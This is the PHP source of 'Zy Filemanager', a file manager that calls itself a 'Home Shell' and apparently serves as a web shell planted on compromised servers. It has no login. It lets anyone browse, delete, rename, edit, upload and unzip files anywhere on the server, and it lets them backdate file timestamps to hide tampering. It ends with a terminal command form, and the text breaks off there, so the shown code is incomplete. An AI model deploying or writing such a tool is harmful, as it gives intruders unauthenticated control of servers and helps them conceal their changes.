<?php
// ===========================================
// KONFIGURASI KEAMANAN DAN STABILITAS
// ===========================================
error_reporting(0); // Nonaktifkan error reporting untuk produksi
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', 'php_errors.log');

// Timezone default
date_default_timezone_set('Asia/Jakarta');

// Session dengan pengaturan keamanan
session_start([
    'cookie_lifetime' => 86400,
    'cookie_httponly' => true,
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'use_strict_mode' => true
]);

// ===========================================
// FUNGSI UTAMA DENGAN ERROR HANDLING
// ===========================================

// Fungsi untuk mendapatkan path dengan error handling
function getSafePath($path) {
    if (!$path || !is_string($path)) {
        return getcwd();
    }
    
    $realpath = realpath($path);
    if ($realpath === false || !is_dir($realpath)) {
        return getcwd();
    }
    
    return $realpath;
}

// Fungsi format size dengan validasi
function formatSize($s) {
    if (!is_numeric($s) || $s < 0) {
        return '0 B';
    }
    
    $s = (float)$s;
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

// Fungsi untuk membersihkan nama file
function sanitizeFilename($filename) {
    $filename = preg_replace('/[^a-zA-Z0-9\.\-\_]/', '', $filename);
    $filename = substr($filename, 0, 255); // Batas panjang nama file
    return $filename;
}

// ===========================================
// VALIDASI DAN SANITASI INPUT
// ===========================================

// Validasi semua input GET/POST
$input_path = isset($_GET['path']) ? $_GET['path'] : '';
if (!is_string($input_path)) {
    $input_path = '';
}

// Path utama dengan validasi
$path = getSafePath($input_path);
$home_shell_path = realpath(dirname(__FILE__)) ?: getcwd();

// ===========================================
// HANDLING OPERASI FILE DENGAN TRY-CATCH
// ===========================================

// 1. DELETE FILE/FOLDER
if (isset($_GET['delete'])) {
    try {
        $delete_target = $_GET['delete'];
        if (!is_string($delete_target)) {
            throw new Exception('Invalid delete target');
        }
        
        $target = realpath($path . '/' . $delete_target);
        if ($target === false || strpos($target, $path) !== 0) {
            throw new Exception('Invalid path');
        }
        
        if (is_file($target)) {
            if (is_writable($target)) {
                $result = unlink($target);
                if (!$result) {
                    throw new Exception('Failed to delete file');
                }
            }
        } elseif (is_dir($target)) {
            // Hapus folder kosong saja
            if (is_writable($target)) {
                $files = scandir($target);
                $files = array_diff($files, ['.', '..']);
                if (empty($files)) {
                    $result = rmdir($target);
                    if (!$result) {
                        throw new Exception('Failed to delete directory');
                    }
                } else {
                    $_SESSION['error'] = 'Directory is not empty';
                }
            }
        }
    } catch (Exception $e) {
        $_SESSION['error'] = 'Delete failed: ' . $e->getMessage();
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}

// 2. RENAME FILE/FOLDER
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    try {
        $from = realpath($path . '/' . $_POST['rename_from']);
        $to_name = sanitizeFilename($_POST['rename_to']);
        $to = $path . '/' . $to_name;
        
        if ($from === false || strpos($from, $path) !== 0 || !file_exists($from)) {
            throw new Exception('Invalid source file');
        }
        
        if ($to_name === '' || file_exists($to)) {
            throw new Exception('Invalid target name or file exists');
        }
        
        $result = rename($from, $to);
        if (!$result) {
            throw new Exception('Rename failed');
        }
    } catch (Exception $e) {
        $_SESSION['error'] = 'Rename failed: ' . $e->getMessage();
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}

// 3. EDIT DATE
if (isset($_POST['edit_date_file'], $_POST['new_date'])) {
    try {
        $target = realpath($path . '/' . $_POST['edit_date_file']);
        if ($target === false || strpos($target, $path) !== 0 || !file_exists($target)) {
            throw new Exception('Invalid file');
        }
        
        $timestamp = strtotime($_POST['new_date']);
        if ($timestamp === false) {
            $timestamp = time();
        }
        
        $result = touch($target, $timestamp);
        if (!$result) {
            throw new Exception('Date update failed');
        }
    } catch (Exception $e) {
        $_SESSION['error'] = 'Date update failed: ' . $e->getMessage();
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}

// 4. CREATE FOLDER
if (isset($_POST['new_folder'])) {
    try {
        $folder_name = sanitizeFilename($_POST['new_folder']);
        if ($folder_name === '') {
            throw new Exception('Invalid folder name');
        }
        
        $full_path = $path . '/' . $folder_name;
        if (file_exists($full_path)) {
            throw new Exception('Folder already exists');
        }
        
        $result = mkdir($full_path, 0755, true);
        if (!$result) {
            throw new Exception('Failed to create folder');
        }
    } catch (Exception $e) {
        $_SESSION['error'] = 'Create folder failed: ' . $e->getMessage();
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}

// 5. CREATE FILE
if (isset($_POST['new_file'])) {
    try {
        $file_name = sanitizeFilename($_POST['new_file']);
        if ($file_name === '') {
            throw new Exception('Invalid file name');
        }
        
        $full_path = $path . '/' . $file_name;
        if (file_exists($full_path)) {
            throw new Exception('File already exists');
        }
        
        $result = file_put_contents($full_path, '');
        if ($result === false) {
            throw new Exception('Failed to create file');
        }
    } catch (Exception $e) {
        $_SESSION['error'] = 'Create file failed: ' . $e->getMessage();
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}

// 6. UPLOAD SINGLE FILE
if (isset($_FILES['upload'])) {
    try {
        if ($_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
            throw new Exception('Upload error: ' . $_FILES['upload']['error']);
        }
        
        $file_name = sanitizeFilename($_FILES['upload']['name']);
        if ($file_name === '') {
            throw new Exception('Invalid file name');
        }
        
        // Cek ekstensi berbahaya
        $dangerous_ext = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps'];
        $ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
        if (in_array($ext, $dangerous_ext)) {
            $file_name .= '.txt'; // Rename ekstensi berbahaya
        }
        
        $dest = $path . '/' . $file_name;
        $result = move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
        if (!$result) {
            throw new Exception('Move uploaded file failed');
        }
    } catch (Exception $e) {
        $_SESSION['error'] = 'Upload failed: ' . $e->getMessage();
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}

// 7. MULTIPLE UPLOAD
if (!empty($_FILES['uploads'])) {
    try {
        foreach ($_FILES['uploads']['name'] as $i => $name) {
            if ($_FILES['uploads']['error'][$i] === UPLOAD_ERR_OK) {
                $file_name = sanitizeFilename($name);
                if ($file_name === '') continue;
                
                // Cek ekstensi berbahaya
                $dangerous_ext = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps'];
                $ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
                if (in_array($ext, $dangerous_ext)) {
                    $file_name .= '.txt';
                }
                
                $tmp = $_FILES['uploads']['tmp_name'][$i];
                $dest = $path . '/' . $file_name;
                
                if (!move_uploaded_file($tmp, $dest)) {
                    $_SESSION['error'] = 'Some files failed to upload';
                }
            }
        }
    } catch (Exception $e) {
        $_SESSION['error'] = 'Multiple upload failed: ' . $e->getMessage();
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}

// 8. ZIP UPLOAD AND EXTRACT
if (!empty($_FILES['zipfile']['name'])) {
    try {
        if ($_FILES['zipfile']['error'] !== UPLOAD_ERR_OK) {
            throw new Exception('Zip upload error: ' . $_FILES['zipfile']['error']);
        }
        
        $zipName = sanitizeFilename($_FILES['zipfile']['name']);
        $tmpZip = $_FILES['zipfile']['tmp_name'];
        
        // Validasi ekstensi zip
        $ext = strtolower(pathinfo($zipName, PATHINFO_EXTENSION));
        if ($ext !== 'zip') {
            throw new Exception('Only ZIP files are allowed');
        }
        
        $destZip = $path . '/' . $zipName;
        
        if (move_uploaded_file($tmpZip, $destZip)) {
            if (!class_exists('ZipArchive')) {
                throw new Exception('ZipArchive class not available');
            }
            
            $zip = new ZipArchive;
            if ($zip->open($destZip) !== TRUE) {
                throw new Exception('Cannot open zip file');
            }
            
            // Extract dengan keamanan
            $zip->extractTo($path);
            $zip->close();
            
            // Hapus file zip setelah extract
            if (file_exists($destZip)) {
                unlink($destZip);
            }
        }
    } catch (Exception $e) {
        $_SESSION['error'] = 'Zip operation failed: ' . $e->getMessage();
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}

// 9. SAVE FILE EDIT
if (isset($_POST['save_file'], $_POST['content'])) {
    try {
        $file = realpath($path . '/' . $_POST['save_file']);
        if ($file === false || strpos($file, $path) !== 0 || !is_file($file)) {
            throw new Exception('Invalid file');
        }
        
        // Backup file sebelum edit
        $backup_name = $file . '.backup_' . date('Ymd_His');
        if (!copy($file, $backup_name)) {
            throw new Exception('Failed to create backup');
        }
        
        $result = file_put_contents($file, $_POST['content']);
        if ($result === false) {
            // Restore from backup if save fails
            if (file_exists($backup_name)) {
                copy($backup_name, $file);
            }
            throw new Exception('Failed to save file');
        }
        
        // Hapus backup jika sukses
        if (file_exists($backup_name)) {
            unlink($backup_name);
        }
    } catch (Exception $e) {
        $_SESSION['error'] = 'Save failed: ' . $e->getMessage();
    }
    
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ===========================================
// HTML OUTPUT DENGAN ERROR DISPLAY
// ===========================================
?>
<!DOCTYPE html>
<html>
<head>
    <title>Zy Filemanager</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Reset dan Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #e0e0e0;
            line-height: 1.6;
            min-height: 100vh;
            padding: 20px;
            transition: background 0.3s, color 0.3s;
        }
        
        /* Error Message Styling */
        .error-message {
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: white;
            padding: 12px 20px;
            border-radius: 6px;
            margin: 15px 0;
            border-left: 5px solid #ff8888;
            box-shadow: 0 3px 10px rgba(255, 68, 68, 0.2);
            animation: slideIn 0.3s ease-out;
        }
        
        .success-message {
            background: linear-gradient(135deg, #44ff44, #00cc00);
            color: white;
            padding: 12px 20px;
            border-radius: 6px;
            margin: 15px 0;
            border-left: 5px solid #88ff88;
            box-shadow: 0 3px 10px rgba(68, 255, 68, 0.2);
            animation: slideIn 0.3s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* Top Bar */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
            padding: 15px 25px;
            border-radius: 10px;
            margin-bottom: 25px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .logo-section h2 {
            color: #00ff88;
            font-size: 28px;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
            margin-bottom: 5px;
        }
        
        .logo-section p {
            color: #88ffaa;
            font-size: 14px;
            font-weight: bold;
        }
        
        /* Controls */
        .controls {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .button {
            background: linear-gradient(135deg, #2d2d2d, #3d3d3d);
            color: white;
            padding: 8px 16px;
            border: 1px solid #555;
            border-radius: 6px;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .button:hover {
            background: linear-gradient(135deg, #3d3d3d, #4d4d4d);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .button-primary {
            background: linear-gradient(135deg, #0088cc, #006699);
            border-color: #00aaff;
        }
        
        .button-primary:hover {
            background: linear-gradient(135deg, #0099dd, #0077aa);
        }
        
        /* Path Navigation */
        .path-nav {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid #333;
        }
        
        .path-nav a {
            color: #00ccff;
            text-decoration: none;
            padding: 3px 6px;
            border-radius: 4px;
            transition: background 0.2s;
        }
        
        .path-nav a:hover {
            background: rgba(0, 204, 255, 0.1);
        }
        
        /* Table Styling */
        table {
            width: 100%;
            background: #1a1a1a;
            border-collapse: collapse;
            margin: 20px 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        th {
            background: linear-gradient(135deg, #2d2d2d, #3d3d3d);
            padding: 15px;
            text-align: left;
            font-weight: 600;
            color: #00ff88;
            border-bottom: 2px solid #00ff88;
        }
        
        td {
            padding: 12px 15px;
            border-bottom: 1px solid #333;
        }
        
        tr:hover {
            background: rgba(0, 255, 136, 0.05);
        }
        
        /* Permission Colors */
        .perm-white { color: white; }
        .perm-green { color: #88ff88; }
        .perm-yellow { color: #ffff88; }
        .perm-red { color: #ff8888; }
        
        /* Forms */
        .form-section {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border: 1px solid #333;
        }
        
        .form-section h3 {
            color: #00ccff;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #00ccff;
        }
        
        input[type="text"],
        input[type="file"],
        input[type="datetime-local"],
        textarea,
        select {
            width: 100%;
            padding: 10px;
            margin: 5px 0 15px 0;
            background: #2d2d2d;
            border: 1px solid #555;
            border-radius: 4px;
            color: white;
            font-family: inherit;
        }
        
        input:focus,
        textarea:focus,
        select:focus {
            outline: none;
            border-color: #00ccff;
            box-shadow: 0 0 0 2px rgba(0, 204, 255, 0.2);
        }
        
        textarea {
            font-family: 'Consolas', 'Monaco', monospace;
            line-height: 1.5;
        }
        
        /* Terminal Section */
        .terminal-section {
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            margin: 20px 0;
            border: 1px solid #00ff88;
        }
        
        .terminal-header {
            background: #00ff88;
            color: #000;
            padding: 10px 15px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .terminal-output {
            padding: 15px;
            max-height: 400px;
            overflow-y: auto;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #00ff00;
            background: #000;
        }
        
        /* Action Buttons */
        .action-btn {
            background: none;
            border: 1px solid #555;
            color: #ccc;
            padding: 4px 8px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            margin: 0 2px;
            transition: all 0.2s;
        }
        
        .action-btn:hover {
            background: rgba(0, 204, 255, 0.1);
            border-color: #00ccff;
            color: #00ccff;
        }
        
        .delete-btn:hover {
            background: rgba(255, 68, 68, 0.1);
            border-color: #ff4444;
            color: #ff4444;
        }
        
        /* Light Theme */
        body.light {
            background: #f5f5f5;
            color: #333;
        }
        
        body.light .top-bar {
            background: linear-gradient(135deg, #e0e0e0, #ffffff);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        body.light .logo-section h2 {
            color: #008855;
            text-shadow: none;
        }
        
        body.light .button {
            background: linear-gradient(135deg, #e0e0e0, #f0f0f0);
            color: #333;
            border-color: #ccc;
        }
        
        body.light table {
            background: white;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }
        
        body.light th {
            background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
            color: #008855;
        }
        
        body.light td {
            border-color: #eee;
        }
        
        body.light .form-section {
            background: white;
            border-color: #ddd;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .top-bar {
                flex-direction: column;
                text-align: center;
            }
            
            .controls {
                flex-wrap: wrap;
                justify-content: center;
            }
            
            table {
                font-size: 14px;
            }
            
            th, td {
                padding: 8px 10px;
            }
        }
        
        /* File Type Icons */
        .file-icon {
            display: inline-block;
            margin-right: 8px;
            width: 16px;
            text-align: center;
        }
        
        .folder-icon {
            color: #ffcc00;
        }
        
        .file-icon-text {
            color: #00ccff;
        }
        
        .file-icon-image {
            color: #ff44ff;
        }
        
        .file-icon-zip {
            color: #ff8800;
        }
        
        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            display: none;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top-color: #00ff88;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Warning Banner */
        .warning-banner {
            background: linear-gradient(135deg, #ffcc00, #ff9900);
            color: #000;
            padding: 10px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
            border-radius: 6px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
    </style>
</head>
<body>

<!-- Loading Overlay -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
</div>

<!-- Warning Banner -->
<div class="warning-banner">
    ⚠️ BACKUP DATA ANDA SECARA TERATUR! File manager ini untuk keperluan teknis.
</div>

<!-- Display Error/Success Messages -->
<?php if (isset($_SESSION['error'])): ?>
    <div class="error-message">
        ⚠️ Error: <?php echo htmlspecialchars($_SESSION['error']); unset($_SESSION['error']); ?>
    </div>
<?php endif; ?>

<?php if (isset($_SESSION['success'])): ?>
    <div class="success-message">
        ✅ Success: <?php echo htmlspecialchars($_SESSION['success']); unset($_SESSION['success']); ?>
    </div>
<?php endif; ?>

<!-- Top Bar -->
<div class="top-bar">
    <div class="logo-section">
        <h2>Zy Filemanager</h2>
        <p>berang berang bawa gelek berangkat lek !!!</p>
    </div>
    <div class="controls">
        <button id="toggleTheme" class="button">🌙 Dark Mode</button>
        <a href="?path=<?php echo urlencode($home_shell_path); ?>" class="button button-primary">🏠 Home Shell</a>
        <a href="#" onclick="showLoading(); window.location.reload();" class="button">🔄 Refresh</a>
    </div>
</div>

<!-- Current Path -->
<div class="path-nav">
    <strong>Current Path:</strong>
    <?php
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $build = '';
    echo '<a href="?path=' . urlencode($home_shell_path) . '">Home Shell</a>';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $build .= '/' . $part;
        echo '/' . '<a href="?path=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a>';
    }
    ?>
</div>

<!-- Navigation -->
<?php if ($path !== '/'): ?>
    <div style="margin-bottom: 15px;">
        <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="button">
            ⬆️ Parent Directory
        </a>
    </div>
<?php endif; ?>

<!-- File Listing -->
<div class="form-section">
    <h3>📁 File Browser</h3>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Permissions</th>
                <th>Modified Date</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php
            try {
                $items = scandir($path);
                if ($items === false) {
                    throw new Exception('Cannot read directory');
                }
                
                $dirs = [];
                $files = [];
                
                foreach ($items as $f) {
                    if ($f === '.' || $f === '..') continue;
                    $full = $path . '/' . $f;
                    
                    if (!file_exists($full)) continue;
                    
                    if (is_dir($full)) {
                        $dirs[] = $f;
                    } else {
                        $files[] = $f;
                    }
                }
                
                // Sort directories and files
                sort($dirs);
                sort($files);
                $all = array_merge($dirs, $files);
                
                foreach ($all as $f):
                    $full = $path . '/' . $f;
                    
                    if (!file_exists($full)) {
                        echo '<tr><td colspan="5" style="color:#ff4444;">⚠️ File tidak ditemukan: ' . htmlspecialchars($f) . '</td></tr>';
                        continue;
                    }
                    
                    // Get file icon
                    $icon = '📄';
                    if (is_dir($full)) {
                        $icon = '📁';
                    } else {
                        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                        if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp'])) {
                            $icon = '🖼️';
                        } elseif (in_array($ext, ['zip', 'rar', '7z', 'tar', 'gz'])) {
                            $icon = '📦';
                        } elseif (in_array($ext, ['php', 'html', 'js', 'css'])) {
                            $icon = '📝';
                        }
                    }
                    
                    // Permissions
                    $perm_num = substr(sprintf('%o', fileperms($full)), -4);
                    $perm_class = 'perm-white';
                    if ($perm_num === '0755' || $perm_num === '0777') {
                        $perm_class = 'perm-green';
                    } elseif ($perm_num === '0000' || $perm_num === '0400') {
                        $perm_class = 'perm-red';
                    }
                    
                    // Last modified
                    $mtime = filemtime($full);
                    $date_formatted = date('Y-m-d H:i:s', $mtime);
            ?>
            <tr>
                <td>
                    <?php echo $icon . ' '; ?>
                    <?php if (is_dir($full)): ?>
                        <a href="?path=<?php echo urlencode($full); ?>" style="font-weight: bold;">
                            <?php echo htmlspecialchars($f); ?>
                        </a>
                    <?php else: ?>
                        <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" title="Click to edit">
                            <?php echo htmlspecialchars($f); ?>
                        </a>
                        <small style="color:#888; margin-left:5px;">
                            (<?php echo number_format(filesize($full)); ?> bytes)
                        </small>
                    <?php endif; ?>
                </td>
                <td><?php echo is_file($full) ? formatSize(filesize($full)) : '<em>DIR</em>'; ?></td>
                <td class="<?php echo $perm_class; ?>">
                    <?php echo $perm_num; ?>
                </td>
                <td>
                    <form method="post" onsubmit="return confirm('Update modification date?')" style="display:flex;gap:5px;align-items:center;">
                        <input type="hidden" name="edit_date_file" value="<?php echo htmlspecialchars($f); ?>">
                        <input type="datetime-local" name="new_date" value="<?php echo date('Y-m-d\\TH:i', $mtime); ?>" style="flex:1;">
                        <button type="submit" class="action-btn" title="Update timestamp">📅</button>
                    </form>
                </td>
                <td>
                    <div style="display:flex;gap:5px;flex-wrap:wrap;">
                        <!-- Rename Form -->
                        <form method="post" onsubmit="return validateRename(this)" style="display:inline;">
                            <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($f); ?>">
                            <input type="text" name="rename_to" value="<?php echo htmlspecialchars($f); ?>" 
                                   style="width:100px; padding:3px;" placeholder="New name">
                            <button type="submit" class="action-btn" title="Rename">✏️</button>
                        </form>
                        
                        <!-- Edit Link (for files only) -->
                        <?php if (is_file($full)): ?>
                            <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" 
                               class="action-btn" title="Edit file">✍️</a>
                        <?php endif; ?>
                        
                        <!-- Download Link (for files only) -->
                        <?php if (is_file($full)): ?>
                            <a href="?path=<?php echo urlencode($path); ?>&download=<?php echo urlencode($f); ?>" 
                               class="action-btn" title="Download">⬇️</a>
                        <?php endif; ?>
                        
                        <!-- Delete Button -->
                        <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" 
                           onclick="return confirmDelete('<?php echo addslashes(htmlspecialchars($f)); ?>')"
                           class="action-btn delete-btn" title="Delete">🗑️</a>
                    </div>
                </td>
            </tr>
            <?php 
                endforeach;
                
                if (empty($all)) {
                    echo '<tr><td colspan="5" style="text-align:center;color:#888;">📁 Directory is empty</td></tr>';
                }
                
            } catch (Exception $e) {
                echo '<tr><td colspan="5" style="color:#ff4444;">⚠️ Error reading directory: ' . htmlspecialchars($e->getMessage()) . '</td></tr>';
            }
            ?>
        </tbody>
    </table>
</div>

<!-- Upload Section -->
<div class="form-section">
    <h3>📤 Upload Files</h3>
    
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 15px;">
        
        <!-- Single File Upload -->
        <div style="border: 2px dashed #555; padding: 20px; border-radius: 8px;">
            <h4 style="margin-bottom: 10px; color: #00ccff;">Single File</h4>
            <form method="post" enctype="multipart/form-data" onsubmit="showLoading()">
                <input type="file" name="upload" required style="margin-bottom: 10px;">
                <input type="submit" value="Upload File" class="button" style="width:100%;">
            </form>
        </div>
        
        <!-- Multiple Files Upload -->
        <div style="border: 2px dashed #555; padding: 20px; border-radius: 8px;">
            <h4 style="margin-bottom: 10px; color: #00ccff;">Multiple Files</h4>
            <form method="post" enctype="multipart/form-data" onsubmit="showLoading()">
                <input type="file" name="uploads[]" multiple required style="margin-bottom: 10px;">
                <input type="submit" value="Upload Files" class="button" style="width:100%;">
            </form>
        </div>
        
        <!-- ZIP Upload & Extract -->
        <div style="border: 2px dashed #555; padding: 20px; border-radius: 8px;">
            <h4 style="margin-bottom: 10px; color: #00ccff;">ZIP Extract</h4>
            <form method="post" enctype="multipart/form-data" onsubmit="showLoading()">
                <input type="file" name="zipfile" accept=".zip" required style="margin-bottom: 10px;">
                <input type="submit" value="Upload & Extract ZIP" class="button" style="width:100%;">
            </form>
            <small style="color:#888; display:block; margin-top:5px;">ZIP file will be deleted after extraction</small>
        </div>
        
    </div>
</div>

<!-- Create New Section -->
<div class="form-section">
    <h3>➕ Create New</h3>
    
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
        
        <!-- Create Folder -->
        <div>
            <h4 style="margin-bottom: 10px; color: #00ccff;">New Folder</h4>
            <form method="post" onsubmit="showLoading()">
                <input type="text" name="new_folder" placeholder="folder_name" required 
                       pattern="[a-zA-Z0-9\.\-\_]+" title="Only letters, numbers, dots, hyphens, underscores">
                <input type="submit" value="Create Folder" class="button" style="width:100%; margin-top:5px;">
            </form>
        </div>
        
        <!-- Create File -->
        <div>
            <h4 style="margin-bottom: 10px; color: #00ccff;">New File</h4>
            <form method="post" onsubmit="showLoading()">
                <input type="text" name="new_file" placeholder="filename.txt" required 
                       pattern="[a-zA-Z0-9\.\-\_]+" title="Only letters, numbers, dots, hyphens, underscores">
                <input type="submit" value="Create File" class="button" style="width:100%; margin-top:5px;">
            </form>
        </div>
        
    </div>
</div>

<!-- File Editor -->
<?php
if (isset($_GET['edit'])):
    $edit_file = $_GET['edit'];
    $edit_path = realpath($path . '/' . $edit_file);
    
    if ($edit_path !== false && strpos($edit_path, $path) === 0 && is_file($edit_path)):
        $content = file_get_contents($edit_path);
        if ($content === false) {
            $content = '';
        }
?>
<div class="form-section">
    <h3>✍️ Editing: <?php echo htmlspecialchars(basename($edit_path)); ?></h3>
    
    <div style="background: #000; padding: 10px; border-radius: 6px; margin-bottom: 15px;">
        <div style="color: #00ff88; font-family: monospace; font-size: 12px;">
            File: <?php echo htmlspecialchars($edit_path); ?><br>
            Size: <?php echo formatSize(filesize($edit_path)); ?> | 
            Last Modified: <?php echo date('Y-m-d H:i:s', filemtime($edit_path)); ?>
        </div>
    </div>
    
    <form method="post" onsubmit="return validateFileSave(this)" id="editForm">
        <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit_path)); ?>">
        
        <div style="margin-bottom: 10px; display: flex; gap: 10px;">
            <button type="button" onclick="backupFile()" class="button" style="flex:1;">
                💾 Backup File
            </button>
            <button type="button" onclick="toggleLineNumbers()" class="button" style="flex:1;">
                🔢 Toggle Line Numbers
            </button>
        </div>
        
        <div style="position: relative;">
            <div id="lineNumbers" style="
                position: absolute;
                left: 0;
                top: 0;
                width: 50px;
                background: #2d2d2d;
                color: #888;
                text-align: right;
                padding: 10px 5px;
                font-family: monospace;
                font-size: 14px;
                line-height: 1.5;
                border-right: 1px solid #555;
                overflow: hidden;
                display: none;
            "></div>
            <textarea name="content" id="fileContent" 
                      style="width: 100%; height: 500px; padding-left: 60px;"
                      spellcheck="false"
                      onkeydown="updateLineNumbers()"
                      onscroll="syncScroll()"><?php echo htmlspecialchars($content); ?></textarea>
        </div>
        
        <div style="margin-top: 15px; display: flex; gap: 10px;">
            <input type="submit" value="💾 Save Changes" class="button button-primary" style="flex:2;">
            <a href="?path=<?php echo urlencode($path); ?>" class="button" style="flex:1;">
                ↩️ Back
            </a>
        </div>
    </form>
</div>

<script>
// Line numbers functionality
function toggleLineNumbers() {
    const lineNumbers = document.getElementById('lineNumbers');
    lineNumbers.style.display = lineNumbers.style.display === 'none' ? 'block' : 'none';
    updateLineNumbers();
}

function updateLineNumbers() {
    const textarea = document.getElementById('fileContent');
    const lineNumbers = document.getElementById('lineNumbers');
    
    if (lineNumbers.style.display === 'none') return;
    
    const lines = textarea.value.split('\n').length;
    let numbers = '';
    for (let i = 1; i <= lines; i++) {
        numbers += i + '<br>';
    }
    lineNumbers.innerHTML = numbers;
    lineNumbers.style.height = textarea.scrollHeight + 'px';
}

function syncScroll() {
    const textarea = document.getElementById('fileContent');
    const lineNumbers = document.getElementById('lineNumbers');
    lineNumbers.scrollTop = textarea.scrollTop;
}

function backupFile() {
    showLoading();
    // Create a backup by copying the file
    fetch('?path=<?php echo urlencode($path); ?>&backup=<?php echo urlencode($edit_file); ?>')
        .then(response => response.text())
        .then(data => {
            hideLoading();
            alert('Backup created successfully!');
        })
        .catch(error => {
            hideLoading();
            alert('Backup failed: ' + error);
        });
}

// Initialize line numbers
document.addEventListener('DOMContentLoaded', function() {
    updateLineNumbers();
});
</script>
<?php
    else:
        echo '<div class="error-message">⚠️ File tidak ditemukan atau tidak dapat diakses</div>';
    endif;
endif;
?>

<!-- Terminal Section -->
<div class="terminal-section">
    <div class="terminal-header">
        <span>💻 Terminal / Command Prompt</span>
        <small>Current Dir: <?php echo htmlspecialchars($path); ?></small>
    </div>
    
    <form method="post" onsubmit="showLoading()" style="padding: 15px;">
        <div style="display: flex; gap: 10px;">
            <input type="text" name="cmd" 
                   placeholder="Enter command (ls, pwd, cat, etc.)"
                   style="flex: 1;"
                   value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>"
                   id="cmdInput">
            <input type="submit" value="Run Command" class="button button-primary">
        </div>
        
        <div style="margin-top: 10px; display: flex; gap: 10px; flex-wrap: wrap;">
            <button type="button" onclick="insertCommand('pwd')" class="action-btn">pwd</button>
            <button type="button" onclick="insertCommand('ls -la')" class="action-btn">ls -la</button>
            <button type="button" onclick="insertCommand('whoami')" class="action-btn">whoami</button>
            <button type="button" onclick="insertCommand('df -h')" class="action-btn">df -h</button>
